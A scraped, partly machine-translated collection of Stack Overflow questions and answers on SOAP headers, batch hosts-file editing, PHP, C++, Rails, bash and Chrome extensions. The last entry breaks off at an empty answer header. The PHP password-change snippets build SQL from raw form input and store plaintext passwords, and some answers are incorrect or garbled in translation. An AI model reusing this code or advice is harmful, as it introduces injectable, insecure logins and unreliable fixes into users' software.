我如何将标题传递给这个。我做了一些研究并安装了 WSE 3.0 并为 service3 添加了参考。但是我无法在 t 中获取 RequestSoapContext 或 clientcredential 方法。client(o) 是从 soaphttpclientprotocol 而不是 WebServicesClientProtocol 生成的，这应该是所有问题的原因。请帮忙。

另外由于动态生成代理，我不确定我是否可以这样做

```
 MessageServiceWse client = new MessageServiceWse() 
```

我也不确定 wsse type 。这个怎么定义。请注意，我使用的是 VS 2010

这是我的第一次服务体验，如果我犯了一些明显的错误，请原谅我。需要专家帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:37:17.400

将端点更改为包含标头，因为它在请求中很常见。

```
 <endpoint address="https://wsext.test.com/gfr/ext/test1/"
    binding="basicHttpBinding" bindingConfiguration="GLEditServiceSOAP"
    contract="test1.GLEditServicePort" name="GLEditServicePort">

    <headers  >
      <wsse:Security  s:actor="AppID" s:mustUnderstand="1" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
        <wsse:UsernameToken>
          <wsse:Username>test1\testuserid</wsse:Username>
          <wsse:Password wsse:Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordText">password</wsse:Password>
        </wsse:UsernameToken>
      </wsse:Security>
    </headers>
  </endpoint> 
```

# java - Retrieve XML element with id using java

> ID：15510037
> 
> 赞同：-1
> 
> 时间：2013-03-19T20:42:44.170
> 
> 标签：java, xml-parsing, atom-feed, qnames

I have a xml retrieved from seedlist service like this.

```
<atom:feed xmlns:opensearch="http://a9.com/-/spec/opensearch/1.1/" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:wplc="http://www.ibm.com/wplc/atom/1.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <atom:link href="/wps/images/icons/scope_search_wcm.gif" rel="icon"/>
  <wplc:field id="name">Locations</wplc:field>
  <wplc:field id="contentSourceType">Seedlist</wplc:field>
  <wplc:field id="defaultcontext">/poc</wplc:field>
  <wplc:field id="effectivedate">1354640637000</wplc:field>
  <wplc:field id="modifier">uid=wpsadmin,o=defaultWIMFileBasedRealm</wplc:field>
  <wplc:field id="securecontext">/mypoc</wplc:field>
  <wplc:field id="search_controllable_uuid">f2bedbba-724e-420b-b066-5d0fef04c421</wplc:field>
  <wplc:field id="locale">en</wplc:field> 
```

I want to retrieve `/mypoc`

```
<wplc:field id="securecontext">/mypoc</wplc:field> 
```

`wplc` tag have common local name `field` So I am unable to retrieve this.

I am using `Abdera` parser to parse xml.

If it is possible I want to retrieve this using `QName` or `Feed.getSimpleExtension()` method

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T20:36:57.020

如果你想坚持使用 Abdera - 那是 Atom 特定的 - 我认为你不能通过一次调用来获得该值：你需要枚举所有在 parent 上`wplc:field`使用的元素then ，并使用检查正确的值.`getFirstChild()``getNextSibling()``id``getAttributeValue()`

如果您使用通用 XML 解析器，您应该能够使用 XPath 直接获取该值，例如：

```
/atom:feed/wplc:field[@id='securecontext'] 
```

`atom`（已经定义了for`http://www.w3.org/2005/Atom`和`wplc`for的前缀`http://www.ibm.com/wplc/atom/1.0`）

# cmd - CMD my program (it must be 15 charcters long)

> ID：15510038
> 
> 赞同：-4
> 
> 时间：2013-03-19T20:42:47.573
> 
> 标签：cmd

Hello everyone I am just finished writting a 1800+ lined code batch file... What it does is it blocks website and unblocks them. Now the features are the you can enter a website and block it and the you can block a whole bunch aswell. Now you can tyoe in the websites name and it will unblock or you can unblock them all uy deleting to file. Now there is a new feature... Redirection, I successfully made that prossible with you guys :). Now what this does it , you have 2 options make a website redirect to another website or redirect to the "Unable to connect page". Yes that is why I asked you guys about how to extract the IP address when you ping a website and then my progrm stores the IP address in a varible. SO you would type a website in e.g. www.facebook.com and it would ping the website and get the IP addess and store it in a varible. But this is a problem when entering a website to unblock. So I use the findstr command to look for the blocked website and remove it but this is a multiuniverse hasale. It would unblock the website the have to redirected IP address in it.

```
173.252.110.27 www.facebook.com www.google.co.za 
173.252.110.27 www.facebook.com www.youtube.com 
```

and when it redirects to the "Unable to connect page" (localhost) it would be like this...

```
127.0.0.1 www.miniclip.com. 
```

Now this is my problem CMD doesnt know which is the blocked website and which is to redirect website. So I need someone to help me with a little code and yes once this is done I promise to give you a link so you can download this program that took me about 173 hours to make because I had to do alot and alot of brainstorming and thinking not just typeing code from the top of my head. Now here is the code I'm stuck with...

```
if %directstate% == uilocalhost (
findstr /i %IPaddress% %%A >>%hosts% 
)

if %directstate% == uiwebsite (
findstr /i %IPaddress% %directmode% %%A >>%hosts%
) 
```

directstate varible is the varible that is the option to redirect to a website or localhost

and if the directstate varible is set on a website the Ipaddress varible is set on the extracted ping IP address and if the directstate is on localhost the IP address is set on 127.0.0.1 and the hosts varible is where the dir of the hosts file is setting.

Here is the entire code to unblock a website...

```
::Uninstall Selected Bocked Website START
:unblockselectedloadmenu
echo [%time%] [UNBLOCK SELECTED MENU STATUS: LOADED MENU] >>%logdir%\WEBMATRIXLOG.log
:unblockselected
set unblockURL=unblockURL
mode 52,22
echo -UNBLOCK SELECTED
echo                  ----MY PROGRAM----
echo.
echo Listing Blocked Addresses...
type %hosts%
echo.
echo b/back
echo Enter the website to unblock:
set /p unblockURL=www.
if %unblockURL% == unblockURL (goto unblockselected ) else if %unblockURL% == b (
echo [%time%] [UNINSTALL SELECTED MENU STATUS: USER BACKED OUT FROM UNINSTALL SELECTED MENU] >>%logdir%\WEBMATRIXLOG.log
goto mainmenu ) else (
echo [%time%] [UNINSTALL SELECTED MENU STATUS: INPUT WEBSITE ADDRESS: www.%unblockURL%] >>%logdir%\WEBMATRIXLOG.log )
echo.
echo Processing...
findstr /i "%unblockURL%" %hosts% >nul
IF %ERRORLEVEL% NEQ 0 (
echo Address is already uninstalled...
ping localhost -n 3 >nul
echo [%time%] [UNINSTALL SELECTED MENU STATUS: ADDRESS IS ALREADY UNINSTALLED] >>%logdir%\WEBMATRIXLOG.log
goto mainmenu )
attrib -r %hosts%
FOR %%A IN (
www.%unblockURL%
) DO (
MOVE %hosts% hosts.bak >NUL
FINDSTR /V /C:"%%A" hosts.bak > %hosts%
DEL /F /Q hosts.bak )
attrib +r %hosts%
echo DONE! - Cleared Selected Blocked Address!
ping localhost -n 2 >nul
echo You may need to restart browser
ping localhost -n 3 >nul
echo [%time%] [UNINSTALL SELECTED MENU STATUS: REMOVED WEBSITE ADDRESS: www.%unblockURL%] >>%logdir%\WEBMATRIXLOG.log
cls 
goto mainmenu
::Uninstall Selected Bocked Website END 
```

Please help me if you understand what I am talking about. Thanks you everyone to make this possible. Remember you will get a copy of this program once it's done. Probably in a few days :)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T23:24:57.517

我怀疑这条线：

```
findstr /i %IPaddress% %directmode% %%A >>%hosts% 
```

这将找到任何包含`%IPaddress%` **OR** `%directmode%`的行。从您的评论`not just the ones on the left hand side`中，我得出结论，您想找到包含字面意思“%IPaddress% %directmode%”的行 - 它们之间有空格。

尝试

```
findstr /i /c:"%IPaddress% %directmode%" %%A >>%hosts% 
```

# php - 更改密码 PHP MySQL

> ID：15510042
> 
> 赞同：1
> 
> 时间：2013-03-19T20:43:12.003
> 
> 标签：php, mysql

我正在编写一段代码，在完成以下表格后更改数据库中的密码：

```
<html>
     <head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    <title>Password Change</title>
     </head>
    <body>
    <h1>Change Password</h1>
   <form method="POST" action="password_change.php">
    <table>
    <tr>
   <td>Enter your UserName</td>
    <td><input type="username" size="10" name="username"></td>
    </tr>
    <tr>
    <td>Enter your existing password:</td>
    <td><input type="password" size="10" name="password"></td>
    </tr>
  <tr>
    <td>Enter your new password:</td>
    <td><input type="password" size="10" name="newpassword"></td>
    </tr>
    <tr>
   <td>Re-enter your new password:</td>
   <td><input type="password" size="10" name="confirmnewpassword"></td>
    </tr>
    </table>
    <p><input type="submit" value="Update Password">
    </form>
   <p><a href="home.php">Home</a>
   <p><a href="logout.php">Logout</a>
   </body>
    </html> 
```

和PHP：

```
 <?php
session_start();
include 'dbconfig.php';

$username = $_POST['username'];
        $password = $_POST['password'];
        $newpassword = $_POST['newpassword'];
        $confirmnewpassword = $_POST['confirmnewpassword'];
        $result = mysql_query("SELECT password FROM user_info WHERE 
user_id='$username'");
        if(!$result)
        {
        echo "The username you entered does not exist";
        }
        else if($password!= mysql_result($result, 0))
        {
        echo "You entered an incorrect password";
        }
        if($newpassword=$confirmnewpassword)
        $sql=mysql_query("UPDATE user_info SET password='$newpassword' where 

 user_id='$username'");
        if($sql)
        {
        echo "Congratulations You have successfully changed your password";
        }
       else
        {
       echo "Passwords do not match";
       }
      ?> 
```

我目前遇到的问题是，当我提交提交按钮时，我会进入此代码的只读页面。

有什么建议么？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-19T21:05:11.810

乍一看，我可以找出你犯的几个主要错误：

如果你在比较你应该使用

```
$newpassword == $confirmnewpassword 
```

并不是

```
$newpassword=$confirmnewpassword 
```

其次，当您使用 if..elseif... 时，循环格式应为

```
if (condition)
  {
  //code to be executed if condition is true;
  }
else if (condition)
  {
 // code to be executed if condition is true;
 }
else
  {
  //code to be executed if condition is false;
 } 
```

您显然错过了其中一个此类循环中的 else 部分。请更正您的语法并重试...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-29T10:45:31.580

您可以首先选择一个表并检查密码是否正确，如果正确则更新密码。否则显示错误消息。嘿，如果旧密码匹配更新密码，这只是更新密码....， [Cracker World](http://www.crackerworld.in/2013/08/change-password-in-php.html)

```
 $old_password=$_POST['old_password'];
$new_password=$_POST['new_password'];
$con_password=$_POST['con_password'];
$chg_pwd=mysql_query("select * from users where id='1'");
$chg_pwd1=mysql_fetch_array($chg_pwd);
$data_pwd=$chg_pwd1['password'];
if($data_pwd==$old_password){
if($new_password==$con_password){
$update_pwd=mysql_query("update users set password='$new_password' where id='1'");
$change_pwd_error="Update Sucessfully !!!";
}
else{
$change_pwd_error="Your new and Retype Password is not match !!!";
}
}
else
{
$change_pwd_error="Your old password is wrong !!!";
}} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-06-29T07:37:39.460

你在这里犯了一个错误这个`include 'dbconfig.php';`

应该是这样的`include ('dbconfig.php');`

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2015-11-08T13:49:49.260

看过你的脚本后，我发现你的密码比较条件中没有使用'=='。

```
if($newpassword=$confirmnewpassword) 
```

这是错误的。您接受了上面的 birju shah 的回答，指出了我想说的话。

除此之外，我发现你没有使用任何加密方法，这是非常错误的。任何人都可以从数据库中破解您的密码。

您应该使用 Password_verify() 和[Password_hash()](http://php.net/manual/en/function.password-hash.php)函数来加密和解密您的密码。这些加密和解密现在被认为是最安全的。您不应该使用 md5 加密，因为现在任何人都可以解密 md5 算法。

在这里，我制作了一个教程[在 PHP 中更改密码代码](http://www.codeandtuts.com/change-password-code-in-php/)。我已经涵盖了上述所有主题。我希望本教程对您有所帮助。

干杯，

# c# - 打开 Intranet URL XP 提示输入凭据 NTLM 兼容性

> ID：15510045
> 
> 赞同：0
> 
> 时间：2013-03-19T20:43:27.127
> 
> 标签：c#, internet-explorer, security, backwards-compatibility, ntlm

我们的网络上有一个 Intranet 站点，它使用 NTLM 执行单点登录，没有问题。我编写了一个 C# 应用程序，它产生一个带有站点 URL 的 IE 窗口。因为该应用程序还从受保护的文件夹安装其他应用程序，并且域上的用户具有受限的权限，所以它使用本地管理帐户运行。

我试过了：

```
System.Diagnostics.Process.Start("IExplore.exe", "http://MyIntranetSite/");
// and
System.Diagnostics.Process.Start("http://MyIntranetSite/"); 
```

这在 Windows 7 上没有任何问题，但在 Windows XP 上，它会提示用户输入 NTLM 身份验证凭据。

有人可以指出我如何解决这个问题的正确方向吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-23T15:43:43.527

最可能的原因是 IE 设置。NTLM SSO 仅在 IE 选择使用 SSPI 并与服务器握手时在客户端起作用。IE 解析 URL 并使用其安全设置来决定是执行 SSO 还是提示输入凭据。 [http://support.microsoft.com/kb/258063](http://support.microsoft.com/kb/258063)

# c# - WebClient.DownloadFileAsync() does not download files correctly on slow network

> ID：15510050
> 
> 赞同：0
> 
> 时间：2013-03-19T20:43:47.267
> 
> 标签：c#, download, webclient, downloadfileasync

My application is used to download files. After the files are downloaded, the size of those files is compared to elements in an XML file for validation. The XML file has an element for each file with a "size" attribute. This is the size that the downloaded file is supposed to be. The files validate fine on a normal Ethernet connection. When a slow wireless connection is used, files are constantly failing validation, *meaning the downloaded files are not the size they're supposed to be*. Why is it that the WebClient DownloadFileAsync() method cannot successfully download a file on a slow or unstable network? Is there any way around this besides retrying over and over?

```
foreach (var file in fileList.OrderBy(x => x.Name))
{
    var client = new WebClient();
    client.DownloadFileCompleted += (o, a) => Task.Factory.StartNew(() => OnDownloadFileCompleted());
    client.DownloadFileAsync(new Uri(AppStrings.FileServer + file.Name), AppStrings.FilePath + file.Name);
    webClientList.Add(client); //used to dispose later, after all files complete.
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-13T03:01:14.207

您试图一次下载太多文件。尝试分批下载。AsyncDownloadCompleted Event 对象上还有一个错误属性，它将告诉您异常是什么。

# c++ - C++ 函数对象不能使用 std::for_each (VS2012) 创建总和

> ID：15510053
> 
> 赞同：2
> 
> 时间：2013-03-19T20:43:55.510
> 
> 标签：c++, visual-studio, stl, foreach, function-object

我在 Visual Studio 2012 中使用函数对象时遇到问题。

我创建了一个简单的`std::vector`，添加了`ints`0-9 并想使用函数对象创建它的总和。我的类定义（内联）：

```
template <class T>
class Sum {
private:
    T val;
public:
    Sum (T i = 0) : val(i) {
    }

    void operator()(T x) { 
        val += x; 
    }

    T result() const { 
        return val; 
    }

    ~Sum() {
        std::cout << "Invoked destructor! val: " << val << " for this: " << this << std::endl;
    }
}; 
```

我的主要功能：

```
int main(int argc, char *argv[]){

    Sum<int> s;

    int contents[] = {1,2,3,4,5,6,7,8,9};

    std::vector<int> vec = std::vector<int>(contents, contents + 9);

    std::for_each(vec.begin(), vec.end(), s);

    std::cout << "Sum of all numbers: " << s.result() << std::endl;

    return 0;
} 
```

使用析构函数的输出，我会得到：

```
Invoked destructor! val: 45 for this: 003BFDA4
Invoked destructor! val: 45 for this: 003BFDE0
Sum of all numbers: 0
Invoked destructor! val: 0 for this: 003BFEFC 
```

这是VS的错误吗？使用调试器运行它，项目被汇总，`45`但随后立即调用析构函数。我究竟做错了什么？

编辑：

这是 Stroustrup 的`The C++ Programming Language`第 18.4 章中的一个示例。我只是想知道它不起作用，因为我完全复制了它。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-19T20:45:23.507

问题是*通过 value*`std::for_each`接受你的仿函数参数。这意味着它适用于原始对象的副本。好消息是它还返回保存修改状态的副本。这应该可以解决问题：

 *```
Sum<int> s1 = std::for_each(vec.begin(), vec.end(), s);
std::cout << "Sum of all numbers: " << s1.result() << std::endl; 
```

或者，您可以让`val`仿函数中的 成为对某个变量的*引用：*

```
template <class T>
class Sum {
private:
    T& val;
public:
    Sum (T& i) : val(i) {
    }
// ... 
```

现在，这应该工作：

```
int i = 0;
Sum<int> s(i);
std::for_each(vec.begin(), vec.end(), s);
std::cout << "Sum of all numbers: " << s1.result() << std::endl; 
```

但是您必须注意确保`i`足够长的生命周期不会产生`Sum<T>::val`悬空引用。*

# ajax - Ruby on Rails i18n change text inside Ajax

> ID：15510062
> 
> 赞同：0
> 
> 时间：2013-03-19T20:44:08.110
> 
> 标签：ajax, ruby-on-rails-3, internationalization, highcharts

I have a Highcharts graph and there's text inside. How can I change this text according to the language selected ? Here is my code :

```
var chart;
chart = new Highcharts.Chart({
(...)
    subtitle: {
        text: document.ontouchstart === undefined ?
        'Click and drag in the plot area to zoom in' :
        'Drag your finger over the plot to zoom in'
        }
(...) 
```

My en.yml file looks like :

```
en:
   actions:
      zoom: "Click and drag in the plot area to zoom in" 
```

I have tried

```
t("actions.zoom") 
```

and

```
<% t "actions.zoom" %> 
```

But they are not working inside the Ajax. How should I do ?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T20:47:51.617

无论您的文件被称为什么，只需添加`erb`扩展名：

`my_file.js.erb`

```
 subtitle: {
    text: document.ontouchstart === undefined ?
      <%= t "actions.zoom" %> : 'something something'
    } 
```

另请注意，`<%=`打印结果，`<%`不会。

编辑：这假设您正在使用 rails 资产管道，如果您不是，它将更加复杂。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T12:57:30.330

尝试使用[i18n-js](https://github.com/fnando/i18n-js) gem 将 Rails 传递`I18n.locale`到您的 javascript 文件中。

# ruby-on-rails - 由于 ID 不匹配，路由到模型内容失败

> ID：15510077
> 
> 赞同：0
> 
> 时间：2013-03-19T20:44:49.247
> 
> 标签：ruby-on-rails, ruby-on-rails-3, url, url-rewriting

我对 Rails 比较陌生，最近设法断开了指向我的一个模型内容的链接......

之前在 stackoverflow 上发布了一个问题，我调整了`to_param`模型中的函数，以便将产品名称附加到产品 ID。

我所做的更改是：

在`products.rb`,

```
def to_param
  "#{id}-#{product_name.parameterize}"  
end 
```

在`routes.rb`,

`match '/:id' => 'uniquewetsuits#show'`

这成功地创建了我希望的地址`/products/ID-product-name`，但是，我收到一条错误消息，指出没有带有 的产品`ID=ID-product-name`。

如果我导航到`/products/ID`，我可以正常成功地查看该页面。

任何人都可以告诉我如何重新连接事物，以便我得到更长的 ID 字符串的匹配项吗？

谢谢你的时间

编辑

控制器的内容是：

```
 def index

#@search = Uniquewetsuit.search(params[:q])
#@findwetsuits = @search.result(:distinct => true)

#if @findwetsuits.count > 0
 # @uniquewetsuits = @findwetsuits.all
#else
  @uniquewetsuits = Uniquewetsuit.all
#end

respond_to do |format|
  format.html # index.html.erb
  format.xml  { render :xml => @uniquewetsuits }
end
end

# GET /uniquewetsuits/1
# GET /uniquewetsuits/1.xml
def show
@uniquewetsuit = Uniquewetsuit.find(params[:id])

respond_to do |format|
  format.html # show.html.erb
  format.xml  { render :xml => @uniquewetsuit }
end
end

# GET /uniquewetsuits/new
# GET /uniquewetsuits/new.xml
def new
@uniquewetsuit = Uniquewetsuit.new

respond_to do |format|
  format.html # new.html.erb
  format.xml  { render :xml => @uniquewetsuit }
end
end

# GET /uniquewetsuits/1/edit
def edit
@uniquewetsuit = Uniquewetsuit.find(params[:id])
end

# POST /uniquewetsuits
# POST /uniquewetsuits.xml
def create
@uniquewetsuit = Uniquewetsuit.new(params[:uniquewetsuit])

respond_to do |format|
  if @uniquewetsuit.save
    format.html { redirect_to(@uniquewetsuit, :notice => 'Uniquewetsuit was successfully created.') }
    format.xml  { render :xml => @uniquewetsuit, :status => :created, :location => @uniquewetsuit }
  else
    format.html { render :action => "new" }
    format.xml  { render :xml => @uniquewetsuit.errors, :status => :unprocessable_entity }
  end
end
end

# PUT /uniquewetsuits/1
# PUT /uniquewetsuits/1.xml
def update
@uniquewetsuit = Uniquewetsuit.find(params[:id])

respond_to do |format|
  if @uniquewetsuit.update_attributes(params[:uniquewetsuit])
    format.html { redirect_to(@uniquewetsuit, :notice => 'Uniquewetsuit was successfully updated.') }
    format.xml  { head :ok }
  else
    format.html { render :action => "edit" }
    format.xml  { render :xml => @uniquewetsuit.errors, :status => :unprocessable_entity }
  end
end
end

# DELETE /uniquewetsuits/1
# DELETE /uniquewetsuits/1.xml
def destroy
@uniquewetsuit = Uniquewetsuit.find(params[:id])
@uniquewetsuit.destroy

respond_to do |format|
  format.html { redirect_to(uniquewetsuits_url) }
  format.xml  { head :ok }
end
end 
```

# php - How to store escaped characters in MySQL and display them in php?

> ID：15510082
> 
> 赞同：0
> 
> 时间：2013-03-19T20:45:11.047
> 
> 标签：php, mysql, text, html-escape-characters

For example I want to store the String "That's all". MySQL automatically escapes the ' character. How do I echo that String from the database using php but remove the \ in front of escaped characters like \' ? I would also like to preserve other formatting like new lines and blank spaces.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T20:51:13.780

If you use prepared statements, those characters will not be escaped on insert.

Use `stripslashes()` to remove slashes if you cannot avoid adding slashes on input.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-19T20:56:54.037

Have you tried `stripslashes()`, regarding the linebreaks just use the `nl2br()` function.

Example:

```
$yourString = "That\'s all\n folks";
$yourString = stripslashes(nl2br($yourString));
echo $yourString; 
```

Note: `\\` double slashes will turn to `\` single slashes

* * *

You should probably setup your own function, something like:

```
$yourString = "That\'s all\n folks";

function escapeString($string) {
    return stripslashes(nl2br($string));
}

echo escapeString($yourString); 
```

There are also several good examples in the `nl2br()` [docs](http://php.net/manual/en/function.nl2br.php)

* * *

**Edit 2**

The reason your are seeing these is because mysql is escaping line breaks, etc. I am guessing you are using `mysql_*` functions. You should probably look into `mysqli` or `PDO`.

Here is an example:

```
$yourString = "That's all
 folks";
echo mysql_escape_string($yourString); 
```

Outputs:

> That\'s all\r\n folks

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-19T20:52:04.363

At first, magic_quotes_gpc escapes the character like ' or ". You can also disable this in your php.ini. But then you should escape the things yourself that no query can get "infected". Lookup mysql injection for more information.

When the escaped string is been written in your database. The string doesn't contain theses escape charakters and when you output them again. You should see the result as you want it.

Me for myself prefer the method by storing everything without escapes and escape or display things when I output them. You could also easily use an `str_replace("\n", "", $text)` to prevent newslines are displayed.

Greetings MRu

# windows - msysgit bash 中的语法错误 =~ 运算符

> ID：15510083
> 
> 赞同：21
> 
> 时间：2013-03-19T20:45:14.227
> 
> 标签：msysgit, windows, bash, msysgit

我正在尝试为我`bash_profile`的[msysgit](/questions/tagged/msysgit "显示标记为“msysgit”的问题")添加一个函数：

```
function git-unpushed {
    brinfo=$(git branch -v | grep git-branch-name)
    if [[ $brinfo =~ ("[ahead "([[:digit:]]*)]) ]]
    then
        echo "(${BASH_REMATCH[2]})"
    fi
} 
```

但我收到以下错误：

> bash：预期的条件二元运算符`
> 
> bash：附近有语法错误`=~'`

据我所知，“等于波浪号”运算符 ( `=~`) 在 bash 中计算为正则表达式。

**为什么会`=~`抛出错误？**

更新：这是手动输入的屏幕截图（正在运行 sh.exe）：

![等于波浪号 (=~) 运算符失败的屏幕截图](../Images/b8cc7b27f0ee21b24120f4d04bb8ea93.png)

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2013-06-07T15:08:15.303

我在 Windows 上安装 Git 时在 Bash 3.1.0 上遇到了同样的错误。最终我将其更改为：

```
if echo $var | grep -E 'regexp' > /dev/null
then
  ...
fi 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-08-21T23:28:06.717

根据[https://groups.google.com/forum/#!topic/msysgit/yPh85MPDyfE](https://groups.google.com/forum/#!topic/msysgit/yPh85MPDyfE) ，这是因为 msys 没有将 libregex 与 bash 一起提供。假设如果您编译/找到一个 msys 构建的 libregex，并将其放在库路径中，则`=~`可以正常工作。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2013-03-20T07:43:56.017

2015 年更新：msysgit 现已过时。**[您应该使用git-for-windows](https://github.com/git-for-windows/git/releases)**
附带的 bash 。 正如在[这个答案](https://stackoverflow.com/a/26826359/6309)中提到的，它使用了一个更新的 bash (4.3+)，它的语法适用。
`=~`

* * *

原始答案（2013 年 3 月）

使用 msysgit 打包的 bash 可能太旧而无法完全支持该运算符。
肯定是太旧了~~与*未引用*的正则表达式进行比较~~，如“ [B​​ash，版本 3](http://tldp.org/LDP/abs/html/bashver3.html) ”和“[如何在 bash 脚本中使用正则表达式？](https://stackoverflow.com/a/304922/6309) ”中所述：

> 从 Bash 3.2 版开始，不再引用要匹配的表达式。

实际上，[mklement0](https://stackoverflow.com/users/45375/mklement0)在评论中提到：

> `=~`在 bash 3.0 中引入，并且始终支持 RHS 上的未引用标记。
> 直到 3.1.x，引用的标记被视为与未引用的标记相同：两者都被解释为正则表达式。
> 3.2 中的变化是带引号的标记（或标记的带引号的子字符串）现在被视为*文字*。

但我尝试使用引号（在最新的 msysgit 1.8.1.2 中），它仍然失败：

```
vonc@voncvb /
$ /bin/bash --version
GNU bash, version 3.1.0(1)-release (i686-pc-msys)
Copyright (C) 2005 Free Software Foundation, Inc.
vonc@voncvb /
$ variable="This is a fine mess."
vonc@voncvb /
$ echo "$variable"
This is a fine mess.
vonc@voncvb /
$ if [[ "$variable" =~ T.........fin*es* ]] ; then echo "ok" ; fi
bash: conditional binary operator expected
bash: syntax error near `=~'
vonc@voncvb /
$ if [[ "$variable" =~ "T.........fin*es*" ]] ; then echo "ok" ; fi
bash: conditional binary operator expected
bash: syntax error near `=~'
vonc@voncvb / 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-10-23T09:40:58.027

这是一个支持提取匹配字符串的解决方案。如果 bash 不支持操作符 =~，则使用 sed 命令（与 msysgit 一起安装）

```
if eval "[[ a =~ a ]]" 2>/dev/null; then
    regexMatch() { # (string, regex)
        eval "[[ \$1 =~ \$2 ]]"
        return $?
    }
elif command -v /bin/sed >/dev/null 2>&1; then
    regexMatch() { # (string, regex)
        local string=$1
        if [[ ${2: -1} = $ ]]; then
            local regex="(${2%$})()()()()()()()()$"
        else
            local regex="($2)()()()()()()()().*"
        fi
        regex=${regex//\//\\/}
        local replacement="\1\n\2\n\3\n\4\n\5\n\6\n\7\n\8\n\9\n"
        local OLD_IFS=$IFS
        IFS=$'\n'
        BASH_REMATCH=($(echo "$string" | /bin/sed -rn "s/$regex/$replacement/p" | while read -r; do echo "${REPLY}"; done))
        IFS=$OLD_IFS
        [[ $BASH_REMATCH ]] && return 0 || return 1
    }
else
    error "your Bash shell does not support regular expressions"
fi 
```

使用示例：

```
if regexMatch "username@host.domain" "(.+)@(.+)"; then
    echo ${BASH_REMATCH[0]}
    echo ${BASH_REMATCH[1]}
    echo ${BASH_REMATCH[2]}
fi 
```

# iframe - 用于删除 iframe 中的 DOM 元素的 Chrome 扩展

> ID：15510089
> 
> 赞同：2
> 
> 时间：2013-03-19T20:45:50.373
> 
> 标签：iframe, google-chrome-extension

我想知道创建 Google Chrome 扩展程序所需的所有组件和步骤，该扩展程序将能够从某个页面的 iframe 中删除一些 DOM 元素。

我的研究表明，由于相同的来源政策，这通过普通的 javascript 是不可能的。

据我所知，从 Chrome 中的代码检查中手动删除 DOM 元素，但我想自动执行此操作。

从其他类似的问题（主要是[这个](https://stackoverflow.com/questions/12384784/is-it-possible-to-access-the-contents-of-iframe-via-chrome-extension)）看来，Chrome 扩展程序应该能够做到这一点。我相信[这](https://stackoverflow.com/questions/14665679/chrome-extension-access-to-frame-elements)是最相似的问题，但尚未得到回答，也不是很清楚。

老实说，我可以从这里开始，但我认为其他人可能会从这个问题和答案中受益，即使我最终回答了自己。

示例 HTML：

```
<!DOCTYPE html>
<html>
<body>
    <iframe src="iframe.htm"></iframe>
</body>
</html> 
```

并且`iframe.htm`：

```
<!DOCTYPE html>
<html>
<body>
    <div id="targetDiv"></div>
</body>
</html> 
```

最终结果应该与运行（使用 jQuery）相同：

```
$('#targetDiv').remove(); 
```

这当然行不通。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-22T23:26:47.213

我完成了我想要的，所以这就是答案。

Chrome 扩展首先需要的是清单文件，`manifest.json`. 这是一个工作示例：

```
{
  "manifest_version": 2,

  "name": "iframe manipulation extension example",
  "description": "This extension allows to run scripts that manipulate cross domain IFRAME contents.",
  "version": "1.0",

  "permissions": [
    "*://target-site.com/*"
  ],
  "content_scripts": [
    {
      "matches": [
        "*://target-site.com/*"
      ],
      "js": ["script.js"],
      "all_frames": true
    }
  ]
} 
```

它有一些不言自明的值，然后`permissions`和`content_scripts`。它基本上说此扩展仅在访问 target-site.com 时才有效。我们指定要运行的文件并设置`"all_frames": true`，它将为页面中的每个框架运行所述文件。

您当然可以在清单中引用的文件中运行所需的任何 javascript。

导航到`chrome://extensions/`加载您的解压扩展或打包它。

请注意，还有其他方法可以获得扩展以运行脚本。这就是我最终得出的最简单的方法。

# php - 在 PHP 中安全地创建和销毁登录会话

> ID：15510094
> 
> 赞同：17
> 
> 时间：2013-03-19T20:46:05.407
> 
> 标签：php, security, authentication

这是我在网站上控制身份验证的代码。我不确定我的逻辑是否正确。如果用户名和密码正确，则会发生以下情况：

```
if(session_start())
{
        session_regenerate_id(true);//without this the session ID will always be the same
        $_SESSION['loggedInUser'] = $uName;
        echo 'You are now logged in';
}
else echo 'Right password/username but session failed to start'; 
```

后续页面检查用户是否登录

```
session_start();
if(isset($_SESSION['loggedInUser'])
{
 //rest of page
}
else echo 'you must log in'; 
```

注销时我有

```
session_start();//if I don't have this the next line produces an error
session_unset();//destroys session variables
session_destroy();//ends session 
```

我红色不在注销时调用 session_start() 但如果我没有它，我会收到消息`Trying to destroy uninitialized session`。我怎样才能解决这个问题？

是否建议根据 IP 地址和用户代理创建指纹？我认为这很糟糕，因为多台计算机可以共享相同的 IP 地址，例如计算机实验室，并且所有流量都通过代理，如果是动态的，同一台计算机可以更改其 IP 地址。另一方面，这种情况多久发生一次？阻止所有会话劫持可能是值得的。

即使您可以推荐信誉良好的文章，我也应该阅读以了解该主题，这将是很棒的，谢谢。

5/6 个答案的投票数少于 0 :( 可以否决选民评论，以便我知道要注意什么？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2013-03-24T07:13:08.333

